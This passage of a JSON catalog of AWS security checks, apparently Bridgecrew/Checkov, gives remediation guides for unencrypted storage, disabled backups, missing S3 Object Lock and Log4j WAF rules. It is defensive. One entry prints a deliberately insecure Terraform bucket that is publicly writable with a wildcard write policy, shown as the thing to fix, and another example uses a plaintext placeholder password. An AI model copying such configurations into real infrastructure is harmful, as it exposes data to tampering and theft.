        "description": "RDS clusters and instances have deletion protection disabled\nDescription\nEnabling deletion protection on Amazon Relational Database Service (RDS) clusters and instances can help to prevent accidental deletion. When deletion protection is enabled, you cannot delete the RDS cluster or instance using the AWS Management Console, the AWS CLI, or the RDS API. This can be helpful if you want to ensure that your RDS resources are not deleted accidentally, either by yourself or by someone else with access to your AWS account.\nFix - Buildtime \nTerraform\n\nResource: aws_rds_cluster\nArgument: deletion_protection\n\nGoresource \"aws_rds_cluster\" \"default\" {\n  ...\n+ deletion_protection = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_140": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-rds-global-clusters-are-encrypted",
        "description": "Unencrypted RDS global clusters \nDescription\nEncrypting your RDS global clusters helps protect your data from unauthorized access or tampering. That way, you can ensure that only authorized users can access and modify the contents of your repositories. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime \nTerraform\n\nResource: aws_rds_global_cluster\nArgument: storage_encrypted \n\nGoresource \"aws_rds_global_cluster\" \"example\" {\n  ...\n+ storage_encrypted         = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_143": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-s3-bucket-has-lock-configuration-enabled-by-default",
        "description": "S3 bucket lock configuration disabled\nDescription\nObject Lock is an Amazon S3 feature that blocks object version deletion during a user-defined retention period, to enforce retention policies as an additional layer of data protection and/or for strict regulatory compliance. The feature provides two ways to manage object retention: retention periods and legal holds. A retention period specifies a fixed time frame during which an S3 object remains locked, meaning that it can't be overwritten or deleted. A legal hold implements the same protection as a retention period, but without an expiration date. Instead, a legal hold remains active until you explicitly remove it.\nEnsure that your Amazon S3 buckets have Object Lock feature enabled in order to prevent the objects they store from being deleted. Used in combination with versioning, which protects objects from being overwritten, AWS S3 Object Lock enables you to store your S3 objects in an immutable form, providing an additional layer of protection against object changes and deletion. S3 Object Lock feature can also help you meet regulatory requirements within your organization when it comes to data protection.\nFix - Runtime\nAWS Console\n\nSign in to AWS Management Console.\nNavigate to S3 dashboard at https://console.aws.amazon.com/s3/.\nClick + Create bucket button to start the setup process.\nWithin Create bucket dialog box, perform the following:\n\n\nFor step 1: Name and region:\nProvide a unique name for the new bucket in the Bucket name box.\nFrom Region dropdown box, select the AWS region where the new S3 bucket will be created.\nFrom Copy settings from an existing bucket dropdown list, select the name of the S3 bucket that you want to re-create.\nClick Next to continue the process.\n\nFor step 2: Configure options:\nUnder Versioning, select Keep all versions of an object in the same bucket checkbox to enable S3 versioning for the bucket. S3 Object Lock requires S3 object versioning.\nClick the Advanced settings tab to shown the advanced configuration settings.\nUnder Object lock, select Permanently allow objects in this bucket to be locked checkbox to enable S3 Object Lock feature for the new bucket.\nClick Next.\n\nFor step 3: Set permissions, set any required permissions or leave the settings unchanged to reflect the source bucket permissions configuration. Click Next to continue.\nFor step 4: Review, verify the resource configuration details, then click Create bucket to create the new S3 bucket.\n\n\n\nClick on the name of the S3 bucket created at the previous step.\nSelect the Properties tab from the S3 dashboard top menu to view bucket properties.\nIn the Advanced settings section, click on the Object Lock box to access the feature configuration panel, where you can define the automatic settings for the objects that are uploaded without object lock configuration.\nInside Object Lock box, select one of the following retention modes. These retention modes apply different levels of protection to the objects within the selected bucket:\n\n\nSelect Enable governance mode so that users cannot overwrite or delete an S3 object version or alter its lock settings unless they have special permissions (e.g. root account). Governance mode enables you to protect objects against deletion by most users while still allowing you to grant some users permission to alter the retention settings or delete the object if required. In the Retention period box, enter the number of days required to protect an object version. Click Save to apply the changes.\nSelect Enable compliance mode so that a protected object version cannot be overwritten or deleted by any user, including the root account user. Once an S3 object is locked in Compliance mode, its retention mode cannot be reconfigured and its retention period cannot be shortened. This retention mode ensures that an object version can't be overwritten or deleted for the duration of the retention period, specified in the Retention period box. Click Save to apply the changes.\n\n\nNow you can transfer the necessary S3 objects from the source bucket, the one with Object Lock feature disabled, to the destination bucket, the one that has Object Lock enabled.\nRepeat steps no. 3 \u2013 9 to enable and configure Amazon S3 Object Lock for other S3 buckets available within your AWS account.\n\nCLI Command\n\nRun create-bucket command (OSX/Linux/UNIX) to (re)create the required Amazon S3 bucket and enable S3 Object Lock feature for all the objects uploaded to this bucket, by using the --object-lock-enabled-for-bucket command parameter:\n\nShellaws s3api create-bucket\n    --bucket cc-project5-protected-logs\n    --region us-east-1\n    --acl private\n    --object-lock-enabled-for-bucket\n\n\nThe command output should return the name of the new Amazon S3 bucket:\n\nShell{\n    \"Location\": \"/cc-project5-protected-logs\"\n}\n\n\nDefine the Object Lock feature configuration parameters by specifying the retention mode and retention period for the new S3 bucket. The following example enables Governance retention mode for 90 days. Governance mode ensures that users cannot overwrite or delete an S3 object version or alter its lock settings unless they have special permissions (e.g. root account access). Governance mode enables you to protect objects against deletion by most users while still allowing you to grant some users permission to alter the retention settings or delete the object if required. Save these configuration parameters to a JSON file named object-lock-config.json:\n\nShell{\n  \"ObjectLockEnabled\": \"Enabled\",\n  \"Rule\": {\n    \"DefaultRetention\": {\n      \"Mode\": \"GOVERNANCE\",\n      \"Days\": 90\n    }\n  }\n}\n\n\nRun put-object-lock-configuration command (OSX/Linux/UNIX) using the configuration parameters defined at the previous step (i.e. object-lock-config.json) to apply your S3 Object Lock configuration to the newly created bucket (the command does not produce an output):\n\nShellaws s3api put-object-lock-configuration\n    --bucket cc-project5-protected-logs\n    --object-lock-configuration file://object-lock-config.json\n\n\n\nTransfer the necessary S3 objects from the source bucket, the one with Object Lock feature disabled, to the destination bucket, the one with S3 Object Lock enabled, created at the previous steps.\n\n\nRepeat steps no. 1 \u2013 5 to enable and configure Amazon S3 Object Lock for other S3 buckets available in your AWS account.\n\n\nFix - Buildtime \nTerraform\n\nResource: aws_s3_bucket\nArgument: object_lock_enabled\n\nGoresource \"aws_s3_bucket\" \"test\" {\n   ...\n+  object_lock_configuration = {\n+     object_lock_enabled = \"Enabled\"\n+  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_57": {
        "url": "https://docs.bridgecrew.io/docs/s3_2-acl-write-permissions-everyone",
        "description": "AWS S3 bucket is publicly writable\nDescription\nUnprotected S3 buckets are one of the major causes of data theft and intrusions. An S3 bucket that allows WRITE access to everyone allows attackers to create, overwrite and delete objects within the bucket, which can lead to: S3 data loss, unintended changes to applications using that bucket, and unexpected charges. The only S3 buckets that should be globally accessible for unauthenticated users or for Any AWS Authenticate Users are those used for hosting static websites. Bucket ACL helps manage access to S3 bucket data. \nWe recommend AWS S3 buckets are not publicly accessible for WRITE actions to protect S3 data from unauthorized users and exposing sensitive data to public access. \nFix - Runtime \nProcedure\nS3 buckets should be protected by using the bucket ACL and bucket policies. If you want to share data with other users via S3 buckets, you could create pre-signed URLs with a short expiration duration. \nTo generate a pre-signed URL for the file samplefile.zip, use the following command:\nBashaws s3 presign --expires-in 36000 s3://sharedfolder/samplefile.zip\n\nTo generate pre-signed URLS for every object in an S3 bucket, use the following command:\nBashaws s3 ls --recursive s3://sharedfolder | awk '{print $4}' | \nwhile read line; do aws s3 presign --expires-in 36000 s3://sharedfolder/$line; done\n\n\ud83d\udcd8NoteFor all automation-related work use the bucket policy and grant access to the required roles.\nFix - Buildtime\nCloudFormation\n\nResource: AWS::S3::Bucket\nArgument: Properties.AccessControl\n\nYAMLType: AWS::S3::Bucket\n    Properties:\n        ...\n-     AccessControl: PublicReadWrite\n\nFix - Buildtime\nTerraform\n\nResource: aws_s3_bucket\nArgument: acl\n\naws_s3_bucket.fail.tfresource \"aws_s3_bucket\" \"fail\" {\n  - acl    = \"public-read-write\"\n  bucket = \"superfail\"\n\n  versioning {\n    enabled    = false\n    mfa_delete = false\n  }\n\n  policy = <<POLICY\n{\n  \"Version\":\"2012-10-17\",\n  \"Statement\":[\n    {\n      \"Sid\":\"AddCannedAcl\",\n      \"Effect\":\"Allow\",\n      \"Principal\": {\"AWS\": [\"*\"]},\n      \"Action\":[\"s3:PutObject\",\"s3:PutObjectAcl\"],\n      \"Resource\":\"arn:aws:s3:::DOC-EXAMPLE-BUCKET/*\",\n      \"Condition\":{\"StringEquals\":{\"s3:x-amz-acl\":[\"public-read\"]}}\n    }\n  ]\n}\nPOLICY\n}\n\nReplace the acl with \"private\" instead of \"public-read-write\", or remove entirely as the default is private.",
        "severity": "CRITICAL"
    },
    "CKV_AWS_131": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-alb-drops-http-headers",
        "description": "ALB does not drop HTTP headers\nDescription\nEnsure that Drop Invalid Header Fields feature is enabled for your Amazon Application Load Balancers (ALBs) in order to follow security best practices and meet compliance requirements. If Drop Invalid Header Fields security feature is enabled, HTTP headers with header fields that are not valid are removed by the Application Load Balancer instead of being routed to the associated targets.\nFix - Buildtime \nTerraform\n\nResource: aws_alb\nArgument: drop_invalid_header_fields\n\nGoresource \"aws_alb\" \"test_success\" {\n                    name               = \"test-lb-tf\"\n                    internal           = false\n                    load_balancer_type = \"network\"\n                    subnets            = aws_subnet.public.*.id\n +                  drop_invalid_header_fields = true\n                }\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_134": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-amazon-elasticache-redis-clusters-have-automatic-backup-turned-on",
        "description": "Amazon ElastiCache Redis clusters do not have automatic backup turned on\nDescription\nAmazon ElastiCache clusters running Redis can back up their data. Using automated backup, you can restore a cluster or seed a new cluster. The backup consists of the cluster's metadata, along with all of the data in the cluster. \nYou can enable or disable automatic backups on an existing Redis cluster or replication group by modifying it using the ElastiCache console, the AWS CLI, or the ElastiCache API. For any Redis cluster, you can enable automatic backups. When automatic backups are enabled, ElastiCache creates a backup of the cluster on a daily basis. There is no impact on the cluster and the change is immediate.\nFix - Buildtime \nTerraform\n\nResource: aws_elasticache_cluster\nArgument: snapshot_retention_limit\n\nGoresource \"aws_elasticache_cluster\" \"example\" {\n  ...\n+ snapshot_retention_limit = 5\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_135": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-ec2-is-ebs-optimized",
        "description": "EC2 EBS is not optimized\nDescription\nEnsuring that EC2 instances are EBS-optimized will help to deliver enhanced performance for EBS workloads. They provide dedicated throughput to Amazon Elastic Block Store (EBS) volumes, which can result in improved EBS performance. Additionally, EBS-optimized instances use a separate network connection for EBS traffic, which can reduce network latency and improve the performance of EBS-intensive workloads.\nFix - Buildtime \nTerraform\n\nResource: aws_instance\nArgument: ebs_optimized\n\nGoresource \"aws_instance\" \"foo\" {\n  ...\n+ ebs_optimized = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_136": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-ecr-repositories-are-encrypted",
        "description": "Unencrypted ECR repositories \nDescription\nEncrypting your ECR repositories helps protect your data from unauthorized access or tampering. That way, you can ensure that only authorized users can access and modify the contents of your repositories. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime \nTerraform\n\nResource: aws_ecr_repository\nArgument: encryption_configuration.encryption_type\n\nGoresource \"aws_ecr_repository\" \"example\" {\n  ...\n  name                 = \"bar\"\n+ encryption_configuration {\n+   encryption_type = \"KMS\"\n+ }\n}\n\nCloudFormation\n\nResource: AWS::ECR::Repository\nArgument: Properties.EncryptionConfiguration.EncryptionType\n\nYAMLResources:\n  KMSEncryption:\n    Type: AWS::ECR::Repository\n    Properties: \n      ...\n+     EncryptionConfiguration:\n+       EncryptionType: \"KMS\"\n        ...\n",
        "severity": "LOW"
    },
    "CKV_AWS_137": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-elasticsearch-is-configured-inside-a-vpc",
        "description": "AWS ElasticSearch cluster is not in a VPC\nDescription\nAWS Elasticsearch domains that reside within a VPC have an extra layer of security when compared to ES domains that use public endpoints. Launching an Amazon ES cluster within an AWS VPC enables secure communication between the ES cluster (domain) and other AWS services without the need for an Internet Gateway, a NAT device or a VPN connection and all traffic remains secure within the AWS Cloud.\nFix - Buildtime \nTerraform\n\nResource: aws_elasticsearch_domain\nArgument: vpc_options\n\nGoresource \"aws_elasticsearch_domain\" \"es\" {\n          domain_name           = var.domain\n          elasticsearch_version = \"6.3\"\n        \n          cluster_config {\n            instance_type = \"m4.large.elasticsearch\"\n          }\n        \n+         vpc_options {\n+           subnet_ids = [\n+             data.aws_subnet_ids.selected.ids[0],\n+             data.aws_subnet_ids.selected.ids[1],\n+           ]\n        \n            security_group_ids = [aws_security_group.es.id]\n          }\n        \n        }\n",
        "severity": "LOW"
    },
    "CKV2_AWS_47": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-cloudfront-attached-wafv2-webacl-is-configured-with-amr-for-log4j-vulnerability",
        "description": "AWS CloudFront attached WAFv2 WebACL is not configured with AMR for Log4j Vulnerability\nDescription\nThis policy identifies AWS CloudFront attached with WAFv2 WebACL which is not configured with AWS Managed Rules (AMR) for Log4j Vulnerability. As per the guidelines given by AWS, CloudFront attached with WAFv2 WebACL should be configured with AWS Managed Rules (AMR) AWSManagedRulesKnownBadInputsRuleSet and AWSManagedRulesAnonymousIpList to protect from Log4j Vulnerability (CVE-2021-44228).\\n\\nFor more information please refer below URL,\\nhttps://aws.amazon.com/security/security-bulletins/AWS-2021-006/\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\nGoresource \"aws_cloudfront_distribution\" \"pass\" {\n  origin {\n    domain_name              = aws_s3_bucket.b.bucket_regional_domain_name\n    origin_access_control_id = aws_cloudfront_origin_access_control.default.id\n    origin_id                = local.s3_origin_id\n  }\n\n  enabled             = true\n  is_ipv6_enabled     = true\n  comment             = \"Some comment\"\n  default_root_object = \"index.html\"\n\n  aliases = [\"mysite.example.com\", \"yoursite.example.com\"]\n\n  default_cache_behavior {\n    allowed_methods  = [\"DELETE\", \"GET\", \"HEAD\", \"OPTIONS\", \"PATCH\", \"POST\", \"PUT\"]\n    cached_methods   = [\"GET\", \"HEAD\"]\n    target_origin_id = local.s3_origin_id\n\n    forwarded_values {\n      query_string = false\n\n      cookies {\n        forward = \"none\"\n      }\n    }\n\n    viewer_protocol_policy = \"allow-all\"\n    min_ttl                = 0\n    default_ttl            = 3600\n    max_ttl                = 86400\n  }\n\n  # Cache behavior with precedence 0\n  ordered_cache_behavior {\n    path_pattern     = \"/content/immutable/*\"\n    allowed_methods  = [\"GET\", \"HEAD\", \"OPTIONS\"]\n    cached_methods   = [\"GET\", \"HEAD\", \"OPTIONS\"]\n    target_origin_id = local.s3_origin_id\n\n    forwarded_values {\n      query_string = false\n      headers      = [\"Origin\"]\n\n      cookies {\n        forward = \"none\"\n      }\n    }\n\n    min_ttl                = 0\n    default_ttl            = 86400\n    max_ttl                = 31536000\n    compress               = true\n    viewer_protocol_policy = \"redirect-to-https\"\n  }\n\n  price_class = \"PriceClass_200\"\n\n  restrictions {\n    geo_restriction {\n      restriction_type = \"whitelist\"\n      locations        = [\"US\", \"CA\", \"GB\", \"DE\"]\n    }\n  }\n\n  tags = {\n    Environment = \"production\"\n  }\n\n  viewer_certificate {\n    cloudfront_default_certificate = true\n  }\n  web_acl_id = aws_wafv2_web_acl.pass_acl.arn\n}\n\nresource \"aws_wafv2_web_acl\" \"pass_acl\" {\n  name        = \"managed-rule-example\"\n  description = \"Example of a managed rule.\"\n  scope       = \"REGIONAL\"\n\n  default_action {\n    allow {}\n  }\n\n  rule {\n    name     = \"rule-1\"\n    priority = 1\n\n    override_action {\n      count {}\n    }\n\n    statement {\n      managed_rule_group_statement {\n        name        = \"AWSManagedRulesAnonymousIpList\"\n        vendor_name = \"AWS\"\n\n        excluded_rule {\n          name = \"SizeRestrictions_QUERYSTRING\"\n        }\n\n        scope_down_statement {\n          geo_match_statement {\n            country_codes = [\"US\", \"NL\"]\n          }\n        }\n      }\n    }\n\n    visibility_config {\n      cloudwatch_metrics_enabled = false\n      metric_name                = \"friendly-rule-metric-name\"\n      sampled_requests_enabled   = false\n    }\n  }\n\n  rule {\n    name     = \"rule-2\"\n    priority = 2\n\n    override_action {\n      count {}\n    }\n\n    statement {\n      managed_rule_group_statement {\n        name        = \"AWSManagedRulesKnownBadInputsRuleSet\"\n        vendor_name = \"AWS\"\n\n        excluded_rule {\n          name = \"SizeRestrictions_QUERYSTRING\"\n        }\n\n        scope_down_statement {\n          geo_match_statement {\n            country_codes = [\"US\", \"NL\"]\n          }\n        }\n      }\n    }\n\n    visibility_config {\n      cloudwatch_metrics_enabled = false\n      metric_name                = \"friendly-rule-metric-name\"\n      sampled_requests_enabled   = false\n    }\n  }\n\n\n  tags = {\n    Tag1 = \"Value1\"\n    Tag2 = \"Value2\"\n  }\n\n  visibility_config {\n    cloudwatch_metrics_enabled = false\n    metric_name                = \"friendly-metric-name\"\n    sampled_requests_enabled   = false\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_42": {
        "url": "https://docs.bridgecrew.io/docs/general_17",
        "description": "AWS EFS with encryption for data at rest is disabled\nDescription\nAmazon Elastic File System (Amazon EFS) is a simple, scalable file storage solution for AWS services and on-premises resources. Amazon EFS is built to elastically scale on-demand. It grows and shrinks automatically as files are added and removed. \nIt is essential to encrypt your Amazon EFS to protect data and metadata against unauthorized access. Encrypting your Amazon EFS also fulfils compliance requirements for data-at-rest encryption when file systems are used in production systems.\nFix - Runtime\nAmazon Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon Elastic File System console.\nTo open the file system creation wizard, click Create file system.\nSelect Enable encryption.\nTo enable encryption using your own KMS CMK key, from the KMS master key list select the name of your AWS Key.\n\nCLI Command\nIn the CreateFileSystem operation, the --encrypted parameter is a Boolean and is required for creating encrypted file systems. The --kms-key-id is required only when you use a customer-managed CMK and you include the key\u2019s alias or ARN. \nShellaws efs create-file-system \\\n--creation-token $(uuidgen) \\\n--performance-mode generalPurpose \\\n--encrypted \\\n--kms-key-id user/customer-managedCMKalias\n\nFix - Buildtime\nTerraform\n\nResource: aws_efs_file_system\nArguments: encrypted - (Optional) If true, the disk will be encrypted. If you are using AWS KMS you can optionally provides a KMS customer master key.\n\naws_efs_file_systemresource \"aws_efs_file_system\" \"example\"{\n  ...\n  creation_token                = \"default-efs\"\n+ encrypted                   = true\n+ kms_key_id = aws_kms_key.default-kms.arn\n}\n\nCloudFormation\n\nResource: AWS::EFS::FileSystem\nArguments: Encrypted - (Optional) If true, the disk will be encrypted. If you are using AWS KMS you can optionally provides a KMS customer master key.\n\nYAMLResources:\n  FileSystemResource:\n    Type: 'AWS::EFS::FileSystem'\n    Properties:\n      ...\n+     Encrypted: true\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_141": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-redshift-clusters-allow-version-upgrade-by-default",
        "description": "Redshift clusters version upgrade is not default\nDescription\nWith Allow Version Upgrade feature enabled, the Amazon Redshift engine upgrades (also known as major version upgrades) will occur automatically so the data warehouse service engine can get the newest features, bug fixes or the latest security patches released.\nFix - Runtime\nCLI Command\n\nRun modify-cluster command (OSX/Linux/UNIX) using the name of the cluster that you want to update as identifier (see Audit section part II, step no. 2) to enable AWS Redshift engine version upgrades for the selected cluster:\n\nShellaws redshift modify-cluster\n    --region us-east-1\n    --cluster-identifier cc-cluster\n    --allow-version-upgrade\n\n\nIf successful, the command output should return the Redshift cluster new configuration metadata:\n\nShell{\n    \"Cluster\": {\n        \"PubliclyAccessible\": true,\n        \"NumberOfNodes\": 1,\n        \"PendingModifiedValues\": {},\n        \"VpcId\": \"vpc-2eb53422\",\n        \"ClusterVersion\": \"1.0\",\n        \"AutomatedSnapshotRetentionPeriod\": 1,\n        \"ClusterParameterGroups\": [\n       ...\n        \"AllowVersionUpgrade\": true,\n       ...\n        \"ClusterSubnetGroupName\": \"default\",\n        \"ClusterSecurityGroups\": [],\n        \"ClusterIdentifier\": \"cc-cluster\",\n        \"AvailabilityZone\": \"us-east-1a\",\n        \"NodeType\": \"ds1.xlarge\",\n        \"ClusterStatus\": \"available\"\n    }\n}\n\n\n\nRepeat step no. 1 and 2 for other Redshift clusters with engine version upgrades disabled, available in the current region.\n\n\nChange the AWS region by updating the --region command parameter value and repeat steps no. 1 - 3 for other regions.\n\n\nFix - Buildtime \nTerraform\n\nResource: aws_redshift_cluster\nArgument: allow_version_upgrade\n\nGoresource \"aws_redshift_cluster\" \"default\" {\n  ...\n+ allow_version_upgrade = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_142": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-redshift-cluster-is-encrypted-by-kms",
        "description": "Redshift cluster is not encrypted by KMS\nDescription\nEncrypting your data and resources with KMS helps protect your data from unauthorized access or tampering. By encrypting your data, you can ensure that only authorized users can access and decrypt the data, and that the data is protected while in storage or in transit. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime \nTerraform\n\nResource: aws_redshift_cluster\nArgument: kms_key_id\n\nGoresource \"aws_redshift_cluster\" \"test\" {\n  ...\n+ kms_key_id         = \"someKey\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_92": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_logging_23",
        "description": "The ELB does not have access logging enabled\nDescription\n These access logs can be used to analyze traffic patterns and troubleshoot security and operational issues.\nAccess logging is an optional feature of ELB that is disabled by default.\nFix - Runtime \nAWS Console\nTBA\nCLI Command\nFix - Buildtime\nTerraform\n\nResource: aws_elb\nArgument: access_logs\n\naws_elb.test.tfresource \"aws_elb\" \"example\" {\n  ...\n  name = \"test-lb-tf\"\n+  access_logs {\n+     bucket  = aws_s3_bucket.lb_logs.bucket\n+     enabled = true\n+  }\n}\n\nCloudFormation\n\nResource: AWS::ElasticLoadBalancing::LoadBalancer\nArgument: Properties.AccessLoggingPolicy.Enabled\n\nYAMLResources:\n  Resource0:\n    Type: 'AWS::ElasticLoadBalancing::LoadBalancer'\n    Properties:\n      ...\n      AccessLoggingPolicy:\n        ...\n+       Enabled: true\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_94": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_37",
        "description": "Glue Data Catalog encryption is not enabled\nDescription\nThis examines the resource aws_glue_data_catalog_encryption_settings and checks that encryption is set up. The properties encrypted_at_rest and connection_encrypted in the blocks connection_password_encryption and encryption_at_rest are examined.\nFix - Runtime\nAWS Console\nTBA\nCLI Command\nFix - Buildtime\nTerraform\n\nResource aws_glue_data_catalog_encryption_settings\nArguments data_catalog_encryption_settings\\connection_password_encryption and data_catalog_encryption_settings\\encryption_at_rest blocks\n\naws_glue_data_catalog_encryption_settings.examplea.tfresource \"aws_glue_data_catalog_encryption_settings\" \"example\" {\n  ...\n+  data_catalog_encryption_settings {\n+    connection_password_encryption {\n+      aws_kms_key_id                       = aws_kms_key.glue.arn\n+      return_connection_password_encrypted = true\n+    }\n+    encryption_at_rest {\n+      catalog_encryption_mode = \"SSE-KMS\"\n+      sse_aws_kms_key_id      = aws_kms_key.glue.arn\n+    }\n+  }\n  ...\n}\n\nCloudFormation\n\nResource AWS::Glue::DataCatalogEncryptionSettings\nArguments Properties.DataCatalogEncryptionSettings\n\nYAMLResources:\n  Example:\n    Type: 'AWS::Glue::DataCatalogEncryptionSettings'\n    Properties:\n        ...\n      DataCatalogEncryptionSettings:\n        ConnectionPasswordEncryption:\n          ...\n+         ReturnConnectionPasswordEncrypted: True\n        EncryptionAtRest:\n            ...\n+         CatalogEncryptionMode: \"SSE-KMS\"\n",
        "severity": "HIGH"
    },
    "CKV_AWS_157": {
        "url": "https://docs.bridgecrew.io/docs/general_73",
        "description": "RDS instances do not have Multi-AZ enabled\nDescription\nAmazon RDS Multi-AZ deployments provide enhanced availability for databases within a single region. In the event of a planned or unplanned outage of your DB instance, Amazon RDS automatically switches to a standby replica in another Availability Zone if you have enabled Multi-AZ.\nRDS Multi-AZ deployments offer the following benefits:\n\nEnhanced durability. \nIncreased availability. \nProtection of your database performance. \nAutomatic failover. \n\nFix - Runtime\nAWS Console\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon RDS console. \nTo create a new Multi-AZ deployment using the AWS Management Console, simply click the \"Yes\" option for \"Multi-AZ Deployment\" when launching a DB Instance. \nTo convert an existing Single-AZ DB Instance to a Multi-AZ deployment, use the \"Modify\" option corresponding to your DB Instance in the AWS Management Console.\n\nCLI Command\nIf you use the create-db-instance AWS CLI command to create a Multi-AZ DB instance, set the --multi-az parameter to true. If you use the CreateDBInstance API operation, set the MultiAZ parameter to true. You can't set the AvailabilityZone parameter if the DB instance is a Multi-AZ deployment.\nShellaws rds create-db-instance \\\n    --db-instance-identifier test-mysql-instance \\\n    --db-instance-class db.t3.micro \\\n    --engine mysql \\\n    --master-username admin \\\n    --master-user-password secret99 \\\n    --allocated-storage 20 \\\n    --multi-az true\n\nFix - Buildtime \nTerraform\n\nResource: aws_db_instance\nArgument: multi_az - Specifies if the RDS instance is Multi-AZ. \n\nGoresource \"aws_db_instance\" \"default\" {\n  ...\n  name                 = \"mydb\"\n+ multi_az             = true \n}\n\nCloudFormation\n\nResource: AWS::RDS::DBInstance\nArgument: Properties.MultiAZ\n\nYAMLResources:\n  MyDBEnabled:\n    Type: 'AWS::RDS::DBInstance'\n    Properties:\n      ...\n+     MultiAZ: true\n",
        "severity": "LOW"
    },
    "CKV2_AWS_14": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-iam-groups-include-at-least-one-iam-user",
        "description": "IAM groups do not include at least one IAM user\nDescription\nIt is generally a best practice to include at least one IAM user in each IAM group. This can help to ensure that there is at least one user who has the permissions associated with the group, which can be useful if you need to delegate certain tasks or responsibilities.\nAdditionally, including at least one IAM user in each group can also make it easier to manage the permissions for those users. For example, if you need to change the permissions associated with a group, you can simply update the group's policy rather than updating the policies for each individual user.\nFix - Buildtime \nTerraform\n\nResource: aws_iam_group_membership, aws_iam_group, aws_iam_user\nArgument: name and users of aws_iam_group_membership\n\nGoresource \"aws_iam_group_membership\" \"ok_group\" {\n  name = \"tf-testing-group-membership\"\n\n  users = [\n    aws_iam_user.user_one.name,\n    aws_iam_user.user_two.name,\n  ]\n\n  group = aws_iam_group.group.name\n}\n\nresource \"aws_iam_group\" \"group\" {\n  name = \"test-group\"\n}\n\nresource \"aws_iam_user\" \"user_one\" {\n  name = \"test-user\"\n}\n\nresource \"aws_iam_user\" \"user_two\" {\n  name = \"test-user-two\"\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_37": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-codecommit-is-associated-with-an-approval-rule",
        "description": "AWS Codecommit is not associated with an approval rule\nDescription\nAssociating AWS Codecommit with an approval rule ensures that code changes are reviewed by other team members before being merged into the main branch of a repository. This can help identify problems or issues with the code before it is deployed, and can also serve as a means of knowledge sharing among team members. \nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_codecommit_repository\" \"pass\" {\n  repository_name = \"MyTestRepository\"\n  description     = \"This is the Sample App Repository\"\n}\n\nresource \"aws_codecommit_approval_rule_template_association\" \"example\" {\n  approval_rule_template_name = aws_codecommit_approval_rule_template.example.name\n  repository_name             = aws_codecommit_repository.pass.repository_name\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_145": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-s3-buckets-are-encrypted-with-kms-by-default",
        "description": "S3 buckets are not encrypted with KMS\nDescription\nEncrypting your data and resources with KMS helps protect your data from unauthorized access or tampering. By encrypting your data, you can ensure that only authorized users can access and decrypt the data, and that the data is protected while in storage or in transit. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime \nTerraform\n\nResource: aws_s3_bucket\n\nGoresource \"aws_s3_bucket\" \"bucket_name\" {\n  bucket = \"bucket_good\"\n}\n\n+ resource \"aws_s3_bucket_server_side_encryption_configuration\" \"good_sse_1\" {\n+   bucket = aws_s3_bucket.bucket_name.bucket\n+\n+   rule {\n+     apply_server_side_encryption_by_default {\n+       kms_master_key_id = aws_kms_key.mykey.arn\n+       sse_algorithm     = \"aws:kms\"\n+     }\n+   }\n+ }\n",
        "severity": "LOW"
    },
    "CKV2_AWS_32": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_networking_65",
        "description": "AWS CloudFront distribution does not have a strict security headers policy attached\nDescription\nAmazon CloudFront is a content delivery network (CDN) that delivers static and dynamic web content using a global network of edge locations. CloudFront introduced response headers policies to address this need and give the customers more control in defining header modifications performed by CloudFront. While it has been possible to manipulate response headers with CloudFront\u2019s edge serverless options, typically it doesn\u2019t require a custom logic unique to the use case. \nFix - Buildtime\nTerraform\n\nResource: aws_cloudfront_distribution  \n*Argument: response_headers_policy_id (Optional) - The identifier for a response headers policy.\n\nGoresource \"aws_cloudfront_distribution\" \"s3_distribution\" {\n  origin {\n    domain_name = aws_s3_bucket.b.bucket_regional_domain_name\n    origin_id   = local.s3_origin_id\n\n    s3_origin_config {\n      origin_access_identity = \"origin-access-identity/cloudfront/ABCDEFG1234567\"\n    }\n  }\n\n+  default_cache_behavior {\n+    response_headers_policy_id = aws_cloudfront_response_headers_policy.pass.id\n+  }\n",
        "severity": "LOW"
    },
    "CKV2_AWS_30": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_logging_32",
